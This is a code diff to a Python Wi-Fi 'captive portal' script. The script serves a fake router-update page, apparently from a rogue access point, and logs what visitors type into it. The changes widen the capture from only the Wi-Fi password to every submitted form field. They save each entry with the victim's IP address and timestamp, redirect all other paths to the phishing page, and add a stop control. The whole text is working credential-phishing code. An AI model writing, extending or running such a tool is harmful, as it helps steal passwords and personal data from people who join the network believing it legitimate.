@@ -10,12 +10,14 @@ import threading
 import time
 import socket
 from datetime import datetime
+from urllib.parse import parse_qs
 
 # ==================== CONFIGURATION ====================
 HTML_FILE = "Router_update_v2.html"
 PORT = 80
 CAPTIVE_PORTAL_SSID = ""
 AP_STATIC_IP = "192.168.1.1/24"
+FORM_OUTPUT_FILE = "captured_form_data.txt"
 
 # ==================== HTTP SERVER CLASS ====================
 class CaptivePortalHandler(BaseHTTPRequestHandler):
@@ -23,7 +25,13 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
         """Handle GET requests - display login page"""
         print(f"[{datetime.now()}] GET request from {self.client_address[0]} to {self.path}")
         
-        # Always redirect to login page
+        if self.path not in ("/", f"/{HTML_FILE}"):
+            self.send_response(302)
+            self.send_header("Location", "/")
+            self.end_headers()
+            return
+
+        # Always display login page
         try:
             with open(HTML_FILE, 'r', encoding='utf-8') as f:
                 html_content = f.read()
@@ -38,33 +46,31 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
         self.wfile.write(html_content.encode('utf-8'))
 
     def do_POST(self):
-        """Handle POST requests - save password"""
+        """Handle POST requests - save submitted form data"""
         content_length = int(self.headers['Content-Length'])
         post_data = self.rfile.read(content_length).decode('utf-8')
         
-        # Parse form data
-        password = ""
-        for item in post_data.split('&'):
-            if item.startswith('wifi_password='):
-                password = item.split('=')[1]
-                password = password.replace('+', ' ')
-                if '%' in password:
-                    import urllib.parse
-                    password = urllib.parse.unquote(password)
-        
+        form_data = parse_qs(post_data, keep_blank_values=True)
+
         client_ip = self.client_address[0]
-        print(f"[{datetime.now()}] New password from {client_ip}: {password}")
-        
-        # Save password to file
-        if password and CAPTIVE_PORTAL_SSID:
-            filename = f"{CAPTIVE_PORTAL_SSID}.txt"
-            try:
-                with open(filename, 'a', encoding='utf-8') as f:
-                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                    f.write(f"[{timestamp}] IP: {client_ip} | Password: {password}\n")
-                print(f"[{datetime.now()}] Password saved to file: {filename}")
-            except Exception as e:
-                print(f"[{datetime.now()}] ERROR saving to file: {e}")
+        print(f"[{datetime.now()}] New form submission from {client_ip}: {form_data}")
+
+        # Save form data to file
+        output_name = FORM_OUTPUT_FILE
+        if CAPTIVE_PORTAL_SSID:
+            output_name = f"{CAPTIVE_PORTAL_SSID}_{FORM_OUTPUT_FILE}"
+        output_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), output_name)
+        try:
+            with open(output_path, 'a', encoding='utf-8') as f:
+                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                f.write(f"[{timestamp}] IP: {client_ip}\n")
+                for key, values in form_data.items():
+                    joined = ", ".join(values)
+                    f.write(f"{key}: {joined}\n")
+                f.write("-" * 40 + "\n")
+            print(f"[{datetime.now()}] Form data saved to file: {output_path}")
+        except Exception as e:
+            print(f"[{datetime.now()}] ERROR saving to file: {e}")
         
         # Response to client
         self.send_response(200)
@@ -196,16 +202,34 @@ def start_captive_portal(interface, ssid):
         server_thread = threading.Thread(target=server.serve_forever)
         server_thread.daemon = True
         server_thread.start()
-        
+
         print(f"\n✅ Captive portal started!")
         print(f"📡 Address: http://{server_ip}")
         print(f"⏱️  Start time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
         print(f"\nℹ️  Connection info will be displayed below:")
+        print("🛑 Press Enter to stop the portal.")
         print(f"{'='*60}\n")
         
+        stop_event = threading.Event()
+
+        def wait_for_stop():
+            try:
+                sys.stdin.readline()
+                print(f"\n[{datetime.now()}] Stop requested via Enter.")
+            except Exception:
+                print(f"\n[{datetime.now()}] Stop requested.")
+            stop_event.set()
+            server.shutdown()
+
+        stop_thread = threading.Thread(target=wait_for_stop, daemon=True)
+        stop_thread.start()
+
         # Main loop
-        while True:
-            time.sleep(1)
+        while not stop_event.is_set():
+            time.sleep(0.5)
+
+        server.server_close()
+        print(f"[{datetime.now()}] Captive portal stopped")
             
     except KeyError:
         print(f"\n❌ No IP address assigned to interface {interface}")
